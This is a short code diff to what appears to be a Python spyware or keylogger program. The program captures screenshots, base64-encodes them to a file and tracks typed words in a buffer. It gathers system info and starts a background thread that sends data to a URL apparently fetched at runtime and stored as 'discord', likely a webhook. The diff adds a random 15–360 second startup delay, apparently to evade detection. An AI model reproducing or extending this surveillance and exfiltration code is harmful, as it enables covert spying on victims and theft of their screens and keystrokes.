@@ -17,7 +17,6 @@ current_word = ""
 buffer = []
 
 
-
 with mss.mss() as sct:
     # The monitor or screen part to capture
     monitor = sct.monitors[1]  # or a region
@@ -28,8 +27,7 @@ with mss.mss() as sct:
     # Generate the PNG
     png_binary = mss.tools.to_png(sct_img.rgb, sct_img.size)
     png_base64 = base64.b64encode(png_binary).decode('utf-8')
-
-    
+ 
 with open("filebyte.txt", "a") as fb:
     fb.write(f"{png_base64}")
     
@@ -148,8 +146,8 @@ if __name__ == "__main__":
     dynamic_url = get_dynamic_url()
     if dynamic_url:
         discord = dynamic_url
+    time.sleep(random.randint(15, 360))
     sys_info()
-
     threading.Thread(target=sender_loop, args=(discord,), daemon=True).start()
     buffer.append(f"Session Started at: {current_time}")
     start()
